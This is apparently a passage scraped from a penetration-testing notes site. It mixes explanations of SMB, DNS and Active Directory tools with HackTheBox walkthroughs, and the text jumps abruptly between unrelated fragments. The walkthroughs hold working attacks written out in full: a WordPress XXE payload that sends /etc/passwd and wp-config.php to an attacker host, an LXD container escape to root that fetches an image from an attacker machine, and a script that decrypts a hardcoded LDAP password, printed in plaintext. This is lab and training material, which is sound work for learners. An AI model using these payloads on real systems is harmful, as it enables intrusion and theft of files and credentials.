It runs mainly on Windows, BUT with the free software project Samba, there is also a solution that enables the use of SMB in Linux and Unix distributions and thus cross-platform communication via SMB.</p> <p>Basically a SMB server provides arbitrary parts of its local file system as shares. Therefore the hierarchy visible to a client is partially independent of the structure on the server. </p> <p>Initially, it was designed to run on top of NetBIOS over TCP/IP (NBT) using TCP port\u00a0<code>139</code>\u00a0and UDP ports\u00a0<code>137</code>\u00a0and\u00a0<code>138</code>. However, with Windows 2000, Microsoft added the option to run SMB directly over TCP/IP on port\u00a0<code>445</code>\u00a0without the extra NetBIOS layer. Nowadays, modern Windows operating systems use SMB over TCP but still support the NetBIOS implementation as a failover. Samba is a Unix/Linux-based open-source implementation of the SMB protocol. It also allows Linux/Unix servers and Windows clients to use the same SMB services.</p> <p>Samba is an alternative variant to the SMB server, developed for Unix-based operating system. Samba implements the <code>Common Internet File System</code> (<code>CIFS</code>) network protocol. CIFS is a \"dialect\" of SMB. In other words, CIFS is a very specific implementation of the SMB protocol, which in turn was created by Microsoft. This allows Samba to communicate with newer Windows systems. Therefore, it usually is referred to as <code>SMB / CIFS</code>. However, CIFS is the extension of the SMB protocol. So when we pass SMB commands over Samba to an older NetBIOS service, it usually connects to the Samba server over TCP ports <code>137</code>, <code>138</code>, <code>139</code>, but CIFS uses TCP port <code>445</code> only. There are several versions of SMB, including outdated versions that are still used in specific infrastructures. Nowadays, modern Windows operating systems use SMB over TCP but still support the NetBIOS implementation as a failover.</p> SMB Version Supported Features CIFS Windows NT 4.0 Communication via NetBIOS interface SMB 1.0 Windows 2000 Direct connection via TCP SMB 2.0 Windows Vista, Windows Server 2008 Performance upgrades, improved message signing, caching feature SMB 2.1 Windows 7, Windows Server 2008 R2 Locking mechanisms SMB 3.0 Windows 8, Windows Server 2012 Multichannel connections, end-to-end encryption, remote storage access SMB 3.0.2 Windows 8.1, Windows Server 2012 R2 SMB 3.1.1 Windows 10, Windows Server 2016 Integrity checking, AES-128 encryption <ul> <li>On Windows, SMB can run directly over port 445 TCP/IP without the need for NetBIOS over TCP/IP</li> <li>but if Windows has NetBIOS enabled, or we are targetting a non-Windows host, we will find SMB running on port 139 TCP/IP. This means that SMB is running with NetBIOS over TCP/IP.</li> </ul> <p>In a network, each host participates in the same <code>workgroup</code>. A workgroup is a group name that identifies an arbitrary collection of computers and their resources on an SMB network. There can be multiple workgroups on the network at any given time. IBM developed an <code>application programming interface</code> (<code>API</code>) for networking computers called the <code>Network Basic Input/Output System</code> (<code>NetBIOS</code>). The NetBIOS API provided a blueprint for an application to connect and share data with other computers. In a NetBIOS environment, when a machine goes online, it needs a name, which is done through the so-called <code>name registration</code> procedure. Either each host reserves its hostname on the network, or the NetBIOS Name Server (<code>NBNS</code>) is used for this purpose. It also has been enhanced to Windows Internet Name Service (<code>WINS</code>).</p> <p>Another protocol that is commonly related to SMB is MSRPC (Microsoft Remote Procedure Call).

SMTP works unencrypted without further measures and transmits all commands, data, or authentication information in plain text.

As the last instance, they are only requested if the name server does not respond. The <code>ICANN</code> coordinates the work of the root name servers. There are 13 such root servers around the globe. <code>Authoritative Nameserver</code> Authoritative name servers hold authority for a particular zone. They only answer queries from their area of responsibility, and their information is binding. If an authoritative name server cannot answer a client's query, the root name server takes over at that point. <code>Non-authoritative Nameserver</code> Non-authoritative name servers are not responsible for a particular DNS zone. Instead, they collect information on specific DNS zones themselves, which is done using recursive or iterative DNS querying. <code>Caching DNS Server</code> Caching DNS servers cache information from other name servers for a specified period. The authoritative name server determines the duration of this storage. <code>Forwarding Server</code> Forwarding servers perform only one function: they forward DNS queries to another DNS server. <code>Resolver</code> Resolvers are not authoritative DNS servers but perform name resolution locally in the computer or router.","tags":["scanning","domain","subdomain","pentesting"]},{"location":"53-dns/#resource-records","title":"Resource records","text":"<p>A resource record is a four-tuple that contains the following 4 fields:</p> <pre><code>(Name, Value, Type, TTL)\n</code></pre> <p>The \"<code>IN</code>\" in the examples stands for \"Internet.\" It's a class field in DNS records that specifies the protocol family. In most cases, you'll see \"<code>IN</code>\" used, as it denotes the Internet protocol suite (IP) used for most domain names. Other class values exist (e.g.,\u00a0<code>CH</code>\u00a0for Chaosnet,\u00a0<code>HS</code>\u00a0for Hesiod) but are rarely used in modern DNS configurations.</p> Record Type Full Name Description Zone File Example <code>A</code> Address Record Maps a hostname to its IPv4 address. If Type=A, then Name is a hostname and Value is the IP address for that name. We recognize the IP addresses that point to a specific (sub)domain through the A record.  Example: <code>(relay1.bar.example.com, 145.222.36.125, A)</code> <code>www.example.com.</code>\u00a0IN A\u00a0<code>192.0.2.1</code> <code>AAAA</code> IPv6 Address Record Maps a hostname to its IPv6 address. <code>www.example.com.</code>\u00a0IN AAAA\u00a0<code>2001:db8:85a3::8a2e:370:7334</code> <code>CNAME</code> Canonical Name Record Creates an alias for a hostname, pointing it to another hostname.

Example:<code>(example.com,relay1.bar.example.com,CNAME)</code> <code>blog.example.com.</code>\u00a0IN CNAME\u00a0<code>webserver.example.net.</code> <code>MX</code> Mail Exchange Record Specifies the mail server(s) responsible for handling email for the domain. If Type=MX, then Value is the canonical name of a mail server that has an alias hostname Name. The mail server records show us which mail server is responsible for managing the emails for the company. Example:<code>(example.com,mail.bar.example.com,MX)</code> <code>example.com.</code>\u00a0IN MX 10\u00a0<code>mail.example.com.</code> <code>NS</code> Name Server Record Delegates a DNS zone to a specific authoritative name server. If Type=NS, then Name is a domain (such as example.com) and Value is the name of an authoritative DNS server that knows how to obtain the IP address for hosts in the domain. These kinds of records show which name servers are used to resolve the FQDN to IP addresses. Most hosting providers use their own name servers, making it easier to identify the hosting provider. Example:<code>(example.com,dns.example.com,NS)</code> <code>example.com.</code>\u00a0IN NS\u00a0<code>ns1.example.com.</code> <code>TXT</code> Text Record Stores arbitrary text information, often used for domain verification or security policies. This type of record often contains verification keys for different third-party providers and other security aspects of DNS, such as SPF, DMARC, and DKIM, which are responsible for verifying and confirming the origin of the emails sent. Here we can already see some valuable information if we look closer at the results. <code>example.com.</code>\u00a0IN TXT\u00a0<code>\"v=spf1 mx -all\"</code>\u00a0(SPF record) <code>SOA</code> Start of Authority Record Specifies administrative information about a DNS zone, including the primary name server, responsible person's email, and other parameters. (<code>Start Of Authority</code> (<code>SOA</code>)). It should be first in a zone file because it indicates the start of a zone. Each zone can only have one <code>SOA</code> record, and additionally, it contains the zone's values, such as a serial number and multiple expiration timeouts. Provides information about the corresponding DNS zone and email address of the administrative contact. The <code>SOA</code> record is located in a domain's zone file and specifies who is responsible for the operation of the domain and how DNS information for the domain is managed. <code>example.com.</code>\u00a0IN SOA\u00a0<code>ns1.example.com. admin.example.com. 2024060301 10800 3600 604800 86400</code> <code>SRV</code> Service Record Defines the hostname and port number for specific services. <code>_sip._udp.example.com.</code>\u00a0IN SRV 10 5 5060\u00a0<code>sipserver.example.com.</code> <code>PTR</code> Pointer Record Used for reverse DNS lookups, mapping an IP address to a hostname. The PTR (Pointer) record works the other way around (reverse lookup). It converts IP addresses into valid domain names. For the IP address to be resolved from the <code>Fully Qualified Domain Name</code> (<code>FQDN</code>), the DNS server must have a reverse lookup file. In this file, the computer name (FQDN) is assigned to the last octet of an IP address, which corresponds to the respective host, using a <code>PTR</code> record.

Removing all other encryption types except for RC4_HMAC_MD5 would allow for the above downgrade example to occur in 2019. Removing support for AES would introduce a security flaw into AD and should likely never be done. </p>","tags":["active directory","ldap","windows"]},{"location":"active-directory-from-windows-privilege-escalation/#mitigating-kerberoasting","title":"Mitigating Kerberoasting","text":"<p>Kerberoasting requests Kerberos TGS tickets with RC4 encryption, which should not be the majority of Kerberos activity within a domain.

If SID history functionality is crucial, SID Filtering can be disabled selectively for specific trusts while mitigating risks through other means (e.g., enhanced monitoring or strict trust policies).</p> </li> </ol> <p>Why SID Filtering is Still Useful</p> <p>While SID Filtering blocks the main functionality of SID history, its purpose is not to disable SID history entirely but to control where and when SID history can be used:</p> <ul> <li> <p>Within the Same Forest:   SID Filtering is typically not applied to intra-forest authentication because all domains in a forest share the same schema and security boundary.

These tools can be used as replacements for various Windows\u00a0<code>net*</code>\u00a0commands and more. PowerView and SharpView can help us gather much of the data that BloodHound does, but it requires more work to make meaningful relationships among all of the data points. These tools are great for checking what additional access we may have with a new set of credentials, targeting specific users or computers, or finding some \"quick wins\" such as users that can be attacked via Kerberoasting or ASREPRoasting. BloodHound Used to visually map out AD relationships and help plan attack paths that may otherwise go unnoticed. Uses the\u00a0SharpHound\u00a0PowerShell or C# ingestor to gather data to later be imported into the BloodHound JavaScript (Electron) application with a\u00a0Neo4j\u00a0database for graphical analysis of the AD environment. SharpHound The C# data collector to gather information from Active Directory about varying AD objects such as users, groups, computers, ACLs, GPOs, user and computer attributes, user sessions, and more. The tool produces JSON files which can then be ingested into the BloodHound GUI tool for analysis. BloodHound.py A Python-based BloodHound ingestor based on the\u00a0Impacket toolkit. It supports most BloodHound collection methods and can be run from a non-domain joined attack host. The output can be ingested into the BloodHound GUI for analysis.

C# Inveigh (InveighZero) The C# version of Inveigh with a semi-interactive console for interacting with captured data such as username and password hashes. rpcinfo The rpcinfo utility is used to query the status of an RPC program or enumerate the list of available RPC services on a remote host. The \"-p\" option is used to specify the target host. For example the command \"rpcinfo -p 10.0.0.1\" will return a list of all the RPC services available on the remote host, along with their program number, version number, and protocol. Note that this command must be run with sufficient privileges. rpcclient A part of the Samba suite on Linux distributions that can be used to perform a variety of Active Directory enumeration tasks via the remote RPC service. CrackMapExec (CME) CME is an enumeration, attack, and post-exploitation toolkit which can help us greatly in enumeration and performing attacks with the data we gather. CME attempts to \"live off the land\" and abuse built-in AD features and protocols like SMB, WMI, WinRM, and MSSQL. Rubeus Rubeus is a C# tool built for Kerberos Abuse. GetUserSPNs.py Another Impacket module geared towards finding Service Principal names tied to normal users.

It can be used for Golden Ticket creation, child to parent trust attacks, etc. raiseChild.py Part of the Impacket toolkit, It is a tool for automated child to parent domain privilege escalation. Active Directory Explorer Active Directory Explorer (AD Explorer) is an AD viewer and editor. It can be used to navigate an AD database and view object properties and attributes. It can also be used to save a snapshot of an AD database for offline analysis. When an AD snapshot is loaded, it can be explored as a live version of the database. It can also be used to compare two AD database snapshots to see changes in objects, attributes, and security permissions. PingCastle Used for auditing the security level of an AD environment based on a risk assessment and maturity framework (based on\u00a0CMMI\u00a0adapted to AD security). Group3r Group3r is useful for auditing and finding security misconfigurations in AD Group Policy Objects (GPO). ADRecon A tool used to extract various data from a target AD environment.

The company uses many different services, and the IT security department felt that a penetration test was necessary to gain insight into their overall security posture. The first server is an internal DNS server that needs to be investigated. In particular, our client wants to know what information we can get out of these services and how this information could be used against its infrastructure. Our goal is to gather as much information as possible about the server and find ways to use that information against the company. However, our client has made it clear that it is forbidden to attack the services aggressively using exploits, as these services are in production. Additionally, our teammates have found the following credentials \"ceil:qwer1234\", and they pointed out that some of the company's employees were talking about SSH keys on a forum.

A zone file describes a zone completely. </p>","tags":["pentesting","dns","enumeration","tools"]},{"location":"dig/#why-is-dns-zone-transfer-needed","title":"Why Is DNS Zone Transfer Needed","text":"<p>Attack vector</p> <p>Unless a DNS server is configured correctly (limiting which IPs can perform a DNS zone transfer), anyone can ask a DNS server for a copy of its zone information since DNS zone transfers do not require any authentication. In addition, the DNS service usually runs on a UDP port; however, when performing DNS zone transfer, it uses a TCP port for reliable data transmission.</p> <p>DNS is a critical service. If a DNS server for a zone is not working and cached information has expired, the domain is inaccessible to all services (web, mail, and more). Therefore, each zone should have at least two DNS servers. For more critical zones, there may be even more.</p> <p>However, a zone may be large and may require frequent changes. If you manually edit zone data on each server separately, it takes a lot of time and there is a a lot of potential for a mistake. This is why DNS zone transfer is needed.</p> <p>You can use different mechanisms for DNS zone transfer but the simplest one is AXFR (technically speaking, AXFR refers to the protocol used during a DNS zone transfer). It is a client-initiated request. Therefore, you can edit information on the primary DNS server and then use AXFR from the secondary DNS server to download the entire zone.  </p> <p>Synchronization between the servers involved is realized by zone transfer. Using a secret key <code>rndc-key</code>, which we have seen initially in the default configuration, the servers make sure that they communicate with their own master or slave. A DNS server that serves as a direct source for synchronizing a zone file is called a master. A DNS server that obtains zone data from a master is called a slave. A primary is always a master, while a secondary can be both a slave and a master. For some <code>Top-Level Domains</code> (<code>TLDs</code>), making zone files for the <code>Second Level Domains</code> accessible on at least two servers is mandatory.</p> <p>Initiating an AXFR zone-transfer request from a secondary server is as simple as using the following dig commands, where zonetransfer.me is the domain that we want to initiate a zone transfer for. First, we will need to get the list of DNS servers for the domain.</p> <pre><code>dig axfr example.htb @$ip\n</code></pre> <p>If the administrator used a subnet for the <code>allow-transfer</code> option for testing purposes or as a workaround solution or set it to <code>any</code>, everyone would query the entire zone file at the DNS server.</p> <p>If misconfigured and left unsecured, this functionality can be abused by attackers to copy the zone file from the primary DNS server to another DNS server. A DNS Zone transfer can provide penetration testers with a holistic view of an organization's network layout. Furthermore, in certain cases, internal network addresses may be found on an organization's DNS servers. </p>","tags":["pentesting","dns","enumeration","tools"]},{"location":"dig/#htb-machines","title":"HTB machines","text":"<p>Some HackTheBox machines exploits DNS zone transfer:</p> <p>In the example of Friendzone machine, accessible web page on port 80 provides an email in which a different domain is appreciated.

Trivial File Transfer Protocol (TFTP) is a simple protocol that provides basic file transfer function with no user authentication. TFTP is intended for applications that do not need the sophisticated interactions that File Transfer Protocol (FTP) provides. It is also revealed that TFTP uses the User Datagram Protocol (UDP) to communicate. This is defined as a lightweight data transport protocol that works on top of IP. </p> <p>UDP provides a mechanism to detect corrupt data in packets, but it does not attempt to solve other problems that arise with packets, such as lost or out of order packets. It is implemented in the transport layer of the OSI Model, known as a fast but not reliable protocol, unlike TCP, which is reliable, but slower then UDP. Just like how TCP contains open ports for protocols such as HTTP, FTP, SSH and etcetera, the same way UDP has ports for protocols that work for UDP.</p> <pre><code>sudo nmap -sU 10.129.95.185   \n</code></pre> <p>You can use metasploit or python to check if can upload/download files.

For that you can copy that file to your /var/www/html folder and start apache2 service.\n</code></pre> <p>Steps to be performed on the victim machine:</p> <pre><code># Download the alpine image. Go for instance to the /tmp folder and, if you have started the apache2 service in the attacker machine, do a wget:\nwget http://AtackerIP//alpine-v3.17-x86_64-20230508_0532.tar.gz\n\n# After the image is built it can be added as an image to LXD as follows:\nlxc image import ./alpine-v3.17-x86_64-20230508_0532.tar.gz --alias myimage\n\n# List available images:\nlxc image list\n\n# Initiate your image inside a new container\nlxc init myimage ignite -c security.privileged=true\n\n# Mount the container inside the /root directory\nlxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true\n\n# Initialize the container\nlxc start ignite\n\n# Launch a shell command in the container\nlxc exec ignite /bin/sh\n</code></pre> <p>Now, we should be root:</p> <pre><code>whoami\ncd /\nfind . -name root.txt 2&gt;/dev/null\n</code></pre>","tags":["walkthrough","lxd exploitation","port 69","tftp","privilege escalation"]},{"location":"htb-lame/","title":"HTB Lame","text":"<pre><code># Reconnaissance\nnmap -sC -sV $IP -Pn\n</code></pre> <pre><code>PORT    STATE SERVICE     VERSION\n21/tcp  open  ftp         vsftpd 2.3.4\n| ftp-syst: \n|   STAT: \n| FTP server status:\n|      Connected to 10.10.14.2\n|      Logged in as ftp\n|      TYPE: ASCII\n|      No session bandwidth limit\n|      Session timeout in seconds is 300\n|      Control connection is plain text\n|      Data connections will be plain text\n|      vsFTPd 2.3.4 - secure, fast, stable\n|_End of status\n|_ftp-anon: Anonymous FTP login allowed (FTP code 230)\n22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)\n| ssh-hostkey: \n|   1024 600fcfe1c05f6a74d69024fac4d56ccd (DSA)\n|_  2048 5656240f211ddea72bae61b1243de8f3 (RSA)\n139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)\n445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)\nService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n\nHost script results:\n|_clock-skew: mean: 2h00m28s, deviation: 2h49m43s, median: 27s\n| smb-os-discovery: \n|   OS: Unix (Samba 3.0.20-Debian)\n|   Computer name: lame\n|   NetBIOS computer name: \n|   Domain name: hackthebox.gr\n|   FQDN: lame.hackthebox.gr\n|_  System time: 2023-04-18T17:35:18-04:00\n| p2p-conficker: \n|   Checking for Conficker.C or higher...\n|   Check 1 (port 25444/tcp): CLEAN (Timeout)\n|   Check 2 (port 29825/tcp): CLEAN (Timeout)\n|   Check 3 (port 9648/udp): CLEAN (Timeout)\n|   Check 4 (port 21091/udp): CLEAN (Timeout)\n|_  0/4 checks are positive: Host is CLEAN or ports are blocked\n|_smb2-time: Protocol negotiation failed (SMB2)\n| smb-security-mode: \n|   account_used: &lt;blank&gt;\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: disabled (dangerous, but default)\n\nNSE: Script Post-scanning.\nNSE: Starting runlevel 1 (of 3) scan.\nInitiating NSE at 17:35\nCompleted NSE at 17:35, 0.00s elapsed\nNSE: Starting runlevel 2 (of 3) scan.\nInitiating NSE at 17:35\nCompleted NSE at 17:35, 0.00s elapsed\nNSE: Starting runlevel 3 (of 3) scan.\nInitiating NSE at 17:35\nCompleted NSE at 17:35, 0.00s elapsed\nRead data files from: /usr/bin/../share/nmap\nService detection performed.

After doing so, we realize that manager is a limited user. It does not have admin rights, ok, but the user manager can upload media.</p> <p>After a little bit of research (reading documentation from wpscan.com we can see that it exists a specific vulnerability for:</p> <ul> <li>a logged user who has enabled media uploading.</li> <li>wordpress version 5.6.2</li> <li>PHP version 8</li> </ul> <p>Since, our user falls into those parameters let's going to read a little bit more about that vulnerability. Read here. Quoting:</p> <p>Description: A user with the ability to upload files (like an Author) can exploit an XML parsing issue in the Media Library leading to XXE attacks. WordPress used an audio parsing library called ID3 that was affected by an XML External Entity (XXE) vulnerability affecting PHP versions 8 and above. This particular vulnerability could be triggered when parsing WAVE audio files. Researchers at security firm SonarSource discovered this XML external entity injection (XXE) security flaw in the WordPress Media Library.</p> <p>Impact: </p> <ul> <li>Arbitrary File Disclosure: The contents of any file on the host\u2019s file system could be retrieved, e.g. wp-config.php which contains sensitive data such as database credentials.</li> <li>Server-Side Request Forgery (SSRF): HTTP requests could be made on behalf of the WordPress installation. Depending on the environment, this can have a serious impact.</li> </ul> <p>This is my first XXE attack! And it's also a pending subject for me because I was asked about it in a job interview for a pentester position and I didn't know how to answer. Great! No pain. Let's get our hands dirty =)</p> <p>Wpscan provides us with a Proof Of Concept (POC):</p> <ol> <li>Create payload.wav:</li> </ol> <pre><code>RIFFXXXXWAVEBBBBiXML&lt;!DOCTYPE r [\n\n&lt;!ELEMENT r ANY &gt;\n\n&lt;!ENTITY % sp SYSTEM \"http://attacker-url.domain/xxe.dtd\"&gt;\n\n%sp;\n\n%param1;\n\n]&gt;\n\n&lt;r&gt;&amp;exfil;&lt;/r&gt;&gt;\n</code></pre> <ol> <li>Create xxe.dtd, the file we're going to serve:</li> </ol> <pre><code>&lt;!ENTITY % data SYSTEM \"php://filter/zlib.deflate/convert.base64-encode/resource=../wp-config.php\"&gt;\n\n&lt;!ENTITY % param1 \"&lt;!ENTITY exfil SYSTEM 'http://attacker-url.domain/?%data;'&gt;\"&gt;\n</code></pre> <p>My IP is 10.10.14.33 and I will be using port 1234 and \"xxe.dtd\" as the name of the file in my server, so payload.wav would be (using flag -en to encode characters):</p> <pre><code>echo -en 'RIFF\\xb8\\x00\\x00\\x00WAVEiXML\\x7b\\x00\\x00\\x00&lt;?xml version=\"1.0\"?&gt;&lt;!DOCTYPE ANY[&lt;!ENTITY % remote SYSTEM '\"'\"'http://10.10.14.33:1234/xxe.dtd'\"'\"'&gt;%remote;%init;%trick;]&gt;\\x00' &gt; payload.wav\n</code></pre> <p>And my xxe.dtd file if I want to get the /etc/password file:</p> <pre><code>&lt;&lt;!ENTITY % file SYSTEM \"php://filter/zlib.deflate/read=convert.base64-encode/resource=/etc/passwd\"&gt;\n&lt;!ENTITY % init \"&lt;!ENTITY &amp;#x25; trick SYSTEM 'http://10.10.14.33:1234/?p=%file;'&gt;\" &gt;\n</code></pre> <p>Now, in the same folder where we have saved xxe.dtd, run a php server.

Noted!</p> <p>To request different content to the WordPress server, we only need to modify our xxe.dtd file and instead of \"/etc/passwd\", use a different path. Common files to check out are:</p> <ul> <li>username/.ssh/id_rsa.pub: with this, we could try to login into the ssh server.</li> <li>/etc/shadow: to extract hashes.</li> <li>In a WordPress server: wp-config.php: inhere you could find some credentials.</li> <li>Logs and more...</li> </ul> <p>Let's start with wp-config.php. We know from previous scans that the WordPress installation is running on a nginx server. Also, we know that wp-cofig.php file is always located at the root of the WordPress installation. Reading at the documentation, we can see that nginx server has a file that displays the enabled sites and provides an absolute path to them. That file is \"/etc/nginx/sites-enabled/default\".

Now we are going to retrieve all these files to pay close attention. Among the commands you can execute you have mget. So we run:</p> <pre><code>mget *\n</code></pre> <p>This will download all the files to the local folder from where you initiated your samba connection. Close the connection:</p> <pre><code>quit\n</code></pre> <p>Now, have a close look at the files we have downloaded. Unzip UserInfo.exe.zip file:</p> <pre><code>unzip UserInfo.exe.zip\n</code></pre> <p>After unzipping UserInfo.exe.zip, you have two files: UserInfo.exe and UserInfo.exe.config. Run:</p> <pre><code>cat UserInfo.exe.config\n</code></pre> <p>Result:</p> <pre><code>&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n&lt;configuration&gt;\n    &lt;startup&gt;\n        &lt;supportedRuntime version=\"v4.0\" sku=\".NETFramework,Version=v4.8\" /&gt;\n    &lt;/startup&gt;\n  &lt;runtime&gt;\n    &lt;assemblyBinding xmlns=\"urn:schemas-microsoft-com:asm.v1\"&gt;\n      &lt;dependentAssembly&gt;\n        &lt;assemblyIdentity name=\"System.Runtime.CompilerServices.Unsafe\" publicKeyToken=\"b03f5f7f11d50a3a\" culture=\"neutral\" /&gt;\n        &lt;bindingRedirect oldVersion=\"0.0.0.0-6.0.0.0\" newVersion=\"6.0.0.0\" /&gt;\n      &lt;/dependentAssembly&gt;\n    &lt;/assemblyBinding&gt;\n  &lt;/runtime&gt;\n&lt;/configuration&gt;\n</code></pre> <p>From this, we can know that UserInfo.exe is a binary assembled with the .NETFramework. Basically, this executable appears to be used to pull user information, likely from Active Directory. Now, if we want to go further in our inspection we will need a .NET decompiler for Linux. Here we have several options.</p> <p>Since it's open source and we are using a kali virtual machine to perform this penetration test, let's use ILSpy, but you can have a look at alternative tools at the end of this walkthrough. To run ILSpy, you need to install it before. Also, it has some dependencies like: .NET 6.0 SDK, Avalonia, dotnet... Install what you are asked and when done, run:</p> <pre><code>cd ~/tools/AvaloniaILSpy/artifacts/linux-x64\n./ILSpy\n</code></pre> <p>Open UserInfo.exe in the program and inspect the code. There are several parts in the code:</p> <ul> <li>References</li> <li>{}</li> <li>{} UserInfo</li> <li>{} UserInfo.Commands</li> <li>{} UserInfo.Services</li> </ul> <p>In the UserInfo.Services you can find the LdadQuery():</p> <p></p> <pre><code>using System.DirectoryServices;\n\npublic LdapQuery()\n{\n    //IL_0018: Unknown result type (might be due to invalid IL or missing references)\n    //IL_0022: Expected O, but got Unknown\n    //IL_0035: Unknown result type (might be due to invalid IL or missing references)\n    //IL_003f: Expected O, but got Unknown\n    string password = Protected.getPassword();\n    entry = new DirectoryEntry(\"LDAP://support.htb\", \"support\\\\ldap\", password);\n    entry.set_AuthenticationType((AuthenticationTypes)1);\n    ds = new DirectorySearcher(entry);\n}\n</code></pre> <p>From where we stand, we can understand that LdapQuery() function is used to login into the Active Directory with the user \"support\". As a password, it calls the getPassword() function. Let's click on that function in the code to see it:</p> <pre><code>public static string getPassword()\n{\n    byte[] array = Convert.FromBase64String(enc_password);\n    byte[] array2 = array;\n    for (int i = 0; i &lt; array.Length; i++)\n    {\n        array2[i] = (byte)((uint)(array[i] ^ key[i % key.Length]) ^ 0xDFu);\n    }\n    return Encoding.Default.GetString(array2);\n}\n</code></pre> <p>Here we can see the necessary steps that we will need to reverse the password if, in the end, we are able to retrieve it. Now, let's click on two function calls: \"enc_password\" and the private function \"key\".</p> <pre><code># enc_password function\n// UserInfo.Services.Protected\nusing System.Text;\n\nprivate static string enc_password = \"0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E\"\n</code></pre> <pre><code># private static byte[] key\n// UserInfo.Services.Protected\nusing System.Text;\n\nprivate static byte[] key = Encoding.ASCII.GetBytes(\"armando\");\n</code></pre> <p>With these two last elements, we can write a script to reverse the function getPassword() and ultimately obtain the password used for \"support\" user to access the Active Directory.</p> <p>Save the script as script.py and this content:</p> <pre><code>import base64\n\nenc_password = \"0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E\"\nkey = b'armando'\n\narray = base64.b64decode(enc_password)\narray2 = ''\nfor i in range(len(array)):\n    array2 += chr(array[i] ^ key[i%len(key)] ^ 223)\n\nprint(array2)\n\u00b4\u00b4\u00b4\n\nNow, give script.py execution permissions and run it:\n\n```bash\nchmod +x script.py\npython script.py\n</code></pre> <p>Decrypted password would be: nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz</p> <p>Before going on, there is another way to get the password besides writing this python script. One of them, for instance, would involve:</p> <ol> <li>Opening a windows machine in the tun0 network range.</li> <li>Opening wireshark and capturing tun0 interface.</li> <li>Running the executable UserInfo.exe from the windows machine.</li> <li>Examining in wireshark the LDAP authentication packet (Follow TCP Stream in a request to port 389).</li> </ol> <p>Summing up, we have:</p> <ul> <li>user: support</li> <li>password: nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz</li> <li>ldap directory: support.htb</li> </ul> <p>Now we can use a tool such as ldapsearch to open a connection to the LDAP server, bind, and perform a search using specified parameters, like:</p> <pre><code>-b searchbase   Use searchbase as the starting point for the search instead of the default.\n-x      Use simple authentication instead of SASL.\n-D binddn   Use the Distinguished Name binddn to bind to the LDAP directory.  For SASL binds, the server is expected to ignore this value.\n-w passwd       Use passwd as the password for simple authentication.\n-H ldapuri  Specify  URI(s)  referring  to  the  ldap  server(s); a list of URI, separated by whitespace or commas is expected\n</code></pre> <p>Using ldapsearch, we run:</p> <pre><code># # ldapsearch -x -H ldap://$ip -D '&lt;DOMAIN&gt;\\&lt;username&gt;' -w '&lt;password&gt;' -b \"CN=Users,DC=&lt;1_SUBDOMAIN&gt;,DC=&lt;TLD&gt;\"\n\nldapsearch -x -H ldap://support.htb -D 'support\\ldap' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b \"CN=Users,DC=support,DC=htb\"\n</code></pre> <p>Results are long and provided in text form. By using a tool such as ldapdomaindump we can get cool results in different formats: .grep, .html, and .json.</p> <pre><code> ldapdomaindump -u 'support\\ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' dc.support.htb\n</code></pre> <p>Then, we can run:</p> <pre><code>firefox domain_users.html\n</code></pre> <p>Results:</p> <p></p> <p>It looks like the support user account has the most permissions. We have a closer look to this user in the results obtained in the ldapsearch:</p> <pre><code># support, Users, support.htb\ndn: CN=support,CN=Users,DC=support,DC=htb\nobjectClass: top\nobjectClass: person\nobjectClass: organizationalPerson\nobjectClass: user\ncn: support\nc: US\nl: Chapel Hill\nst: NC\npostalCode: 27514\ndistinguishedName: CN=support,CN=Users,DC=support,DC=htb\ninstanceType: 4\nwhenCreated: 20220528111200.0Z\nwhenChanged: 20221109173336.0Z\nuSNCreated: 12617\ninfo: Ironside47pleasure40Watchful\nmemberOf: CN=Shared Support Accounts,CN=Users,DC=support,DC=htb\nmemberOf: CN=Remote Management Users,CN=Builtin,DC=support,DC=htb\nuSNChanged: 81981\ncompany: support\nstreetAddress: Skipper Bowles Dr\nname: support\nobjectGUID:: CqM5MfoxMEWepIBTs5an8Q==\nuserAccountControl: 66048\nbadPwdCount: 0\ncodePage: 0\ncountryCode: 0\nbadPasswordTime: 0\nlastLogoff: 0\nlastLogon: 0\npwdLastSet: 132982099209777070\nprimaryGroupID: 513\nobjectSid:: AQUAAAAAAAUVAAAAG9v9Y4G6g8nmcEILUQQAAA==\naccountExpires: 9223372036854775807\nlogonCount: 0\nsAMAccountName: support\nsAMAccountType: 805306368\nobjectCategory: CN=Person,CN=Schema,CN=Configuration,DC=support,DC=htb\ndSCorePropagationData: 20220528111201.0Z\ndSCorePropagationData: 16010101000000.0Z\nlastLogonTimestamp: 133124888166969633\n</code></pre> <p>There!

Therefore, it lets an attacker enumerate precious info such as passwords, system users, system groups, running system processes... The challenge here was to choose the best-suited tools to perform this enumeration.

This is due to a misconfiguration and we can exploit it.</p> <p>For starters, michael has writing permissions over the configuration files located in /etc/fail2ban/action.d</p> <p>Run:</p> <pre><code>ls -la /etc/fail2ban\n</code></pre> <p>And we can see michael, as part of the security group has rwx rights on the directory owned by root:</p> <pre><code>...\ndrwxrwx---   2 root security  4096 Oct 20 11:03 action.d\n...\n</code></pre> <p>Now we need to understand what fail2ban is and how it works. fail2ban is a great IDPS tool, not only it can detect attacks but also block malicious IP addresses by using Linux iptables. Although fail2ban can be used for services like HTTP, SMTP, IMAP, etc. most sys-admins use it to protect the SSH service. fail2ban daemon reads the log files and if there is a malicious pattern detected (e.g multiple failed login requests) it executes a command for blocking the IP for a certain period of time or maybe forever.</p> <p>In the file /etc/fail2ban/jail.conf, we can spot some customizations such as ban time and maxretry:</p> <pre><code>cat /etc/fail2ban/jail.conf\n</code></pre> <p>And we see that bantime is limited to 10 seconds and maximum of retries to 5:</p> <pre><code># \"bantime\" is the number of seconds that a host is banned.\nbantime  = 10s\n\n# A host is banned if it has generated \"maxretry\" during the last \"findtime\"\n# seconds.\nfindtime  = 10s\n\n# \"maxretry\" is the number of failures before a host gets banned.\nmaxretry = 5\n</code></pre> <p>This means 